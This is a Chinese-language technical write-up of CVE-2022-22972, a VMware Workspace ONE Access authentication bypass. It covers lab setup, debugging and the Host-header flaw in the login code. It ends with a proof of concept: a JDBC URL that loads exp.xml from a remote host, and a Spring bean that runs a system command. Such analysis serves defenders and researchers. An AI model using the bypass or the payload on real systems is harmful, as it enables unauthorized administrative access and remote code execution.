## **漏洞描述**

5 月 18 日，VMware 发布了一份公告 ( VMSA-2022-0014 )，以解决多个 VMware
产品中的两个漏洞，其中包括CVE-2022-22972，该漏洞在身份认证处理时存在一定缺陷。远程攻击者可通过伪造相关请求信息来绕过身份验证，从而获取相关应用程序的管理权限。

![](https://image.3001.net/images/20220617/1655460378_62ac521a39fe624eb8b07.png!small)

##  **相关介绍**

VMware是一家提供全球桌面到数据中心虚拟化解决方案的厂商，其推出的产品包括我们最熟悉的VMware
Workstation，一款桌面虚拟计算软件。此次漏洞涉及的多个产品介绍如下：

VMware Workspace ONE Access 是 VMware 公司开发的一款智能驱动型数字化工作空间平台，通过 Workspace ONE
Access 能够随时随地在任意设备上轻松、安全地交付和管理任意应用。VMware vRealize Automation
是自动化部署方案云管平台。VMware Cloud Foundation 是 VMware公司混合云平台。vRealize Suite Lifecycle
Manager 是 vRealize Suite 生命周期和内容管理平台。

##  **利用范围**

  * VMware Workspace ONE Access 21.08.0.1, 21.08.0.0，20.10.0.1, 20.10.0.0

  * VMware Identity Manager（vIDM） 3.3.6, 3.3.5, 3.3.4, 3.3.3

  * VMware vRealize Automation(vIDM) 7.6

  * VMware Cloud Foundation (vIDM) 4.4, 4.3.x, 4.2.x, 4.1, 4.0.x

  * VMware Cloud Foundation (vRA) 3.x

  * vRealize Suite Lifecycle Manager(vIDM) 8.x

##  **漏洞分析**

简单回顾下CVE-2022-22954（VMware Workspace ONE Access
SSTI漏洞），属于模板注入漏洞，恶意攻击者可以利用此漏洞在未经过身份验证的情况下进行远程任意代码执行；CVE-2022-22957（VMware
Workspace ONE Access
JDBC注入漏洞），由于相关参数完全可控，恶意攻击者可实行JDBC注入，通过写入任意文件等方式获取系统权限。此次的CVE-2022-22972，同样选择VMware
Workspace ONE Access漏洞版本来进行分析，并详细记录环境搭建和漏洞分析复现过程。

###  **环境搭建**

先从官网（https://customerconnect.vmware.com/downloads/details?downloadGroup=WS1A_ONPREM_210801&productId=1269）下载VMware
Workspace ONE Access 21.08.0.1 OVA文件

![](https://image.3001.net/images/20220617/1655460623_62ac530f0bdb40b586a94.png!small)使用VMware
Workstation导入OVA文件，配置FQDN（主机名设置为随机域名，不然后续配置数据库时会报错）。

![](https://image.3001.net/images/20220617/1655460689_62ac5351a2f0f422e6dd7.png!small)导入成功后会进行初始化，完成后出现如下信息。

![](https://image.3001.net/images/20220617/1655460710_62ac5366594547ae0a3dd.png!small)访问https://<域名：8443>，根据提示进行账号和数据库配置。

![](https://image.3001.net/images/20220617/1655460735_62ac537fb6991af3267af.png!small)按照要求，一步一步完成配置即可。

![](https://image.3001.net/images/20220617/1655460761_62ac5399c573e930d0d96.png!small)

为搭建动态调试环境，需将相关源码保存到本地，并使用IDEA开启远程调试

需要的lib文件位于/usr/local/horizon/lib/embeddedauthadapters目录下。

![](https://image.3001.net/images/20220617/1655460803_62ac53c358f68e9b0f1f7.png!small)IDEA配置远程调试。

![](https://image.3001.net/images/20220617/1655460830_62ac53de967f32b666e7f.png!small)将远程调试命令写入/opt/vmware/horizon/workspace/bin/setenv.sh。

![](https://image.3001.net/images/20220617/1655460873_62ac540954ab1098767a0.png!small)重启服务之后，配置iptables防火墙，允许数据包通过INPUT链和OUTPUT链。

![](https://image.3001.net/images/20220617/1655460894_62ac541e0d759d361fdcd.png!small)最后访问https://<域名>，到登陆页面，环境搭建成功。

![](https://image.3001.net/images/20220617/1655460926_62ac543e8bea7a896c1da.png!small)

###  **动态分析**

抓取登陆数据包，修改Host头为tessdadddd后进行重放。

![](https://image.3001.net/images/20220617/1655460984_62ac547856ed6d2e063e0.png!small)

回到vmware中，查看/opt/vmware/horizon/workspace/logs/horizon.log

在日志中发现，vm对任意输入的host头，发送了HTTP请求，并且因为无法解析而抛出异常。

![](https://image.3001.net/images/20220617/1655461019_62ac549b6b43515f93519.png!small)

同时，根据日志信息中整个认证的调用栈，我们将分析的开端定位在local-password-auth-adapter-0.1.jar中。

分析com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#login函数。

![](https://image.3001.net/images/20220617/1655461040_62ac54b0c4604e2c650a2.png!small)

在获取到账号密码等信息之后，通过getLocalUrl函数来提取参数endpoint

跟进com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#getLocalUrl函数。

  
![](https://image.3001.net/images/20220617/1655461080_62ac54d82563831c55f33.png!small)

在getLocalUrl函数中，会构造出一个新的HTTPS请求，其中的主机地址则是通过request.getServerName从HOST头中直接获取。因此这也为我们绕过认证伪造主机地址创造了条件。

继续跟进将回到com.vmware.horizon.adapters.local.LocalPasswordAuthAdapter#login

此时的endpoint即为新构造的HTTPS请求，主机名则为我们任意输入的tessdadddd。

![](https://image.3001.net/images/20220617/1655461104_62ac54f00b76640d2ee3c.png!small)

后续，则会调用authenticate函数来完成认证。

在com.vmware.horizon.adapters.local.LocalPasswordService#authenticate中可以发现。

![](https://image.3001.net/images/20220617/1655461182_62ac553eb933b41c13002.png!small)

通过之前的HTTPS请求，使用POST方式发送，后续会直接根据请求返回的状态码来判断是否认证成功，若状态码为200，即认证成功。因此可通过伪造HOST头和伪造HTTPS服务器并保证对任何请求返回状态200，即可实现认证绕过。

###  **漏洞复现**

伪造HTTPS服务器，满足对任意请求都返回200。

![](https://image.3001.net/images/20220617/1655461241_62ac55795c36a08f461b0.png!small)

修改HOST为伪造的HTTPS服务器地址，成功绕过认证并获取有效cookie。

![](https://image.3001.net/images/20220617/1655461265_62ac5591e832b0461fab9.png!small)POC

    
    
    jdbc:postgresql://xxx.xxx.com/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://xxx/exp.xml
    

exp.xml

    
    
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
      <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>cmd</value>
            <value>/c</value>
            <value>whoami</value>
          </list>
        </constructor-arg>
      </bean>
    </beans>

##  **参考材料**

1\. https://www.vmware.com/security/advisories/VMSA-2022-0014.html

2\. https://www.horizon3.ai/vmware-authentication-bypass-vulnerability-cve-2022-22972-technical-deep-dive/

3\. https://y4er.com/post/cve-2022-22972-vmware-workspace-one-access-authentication-bypass-rce/

4\. <https://mp.weixin.qq.com/s/fQIfOHgTB9fEkczdJ8-IBQ>

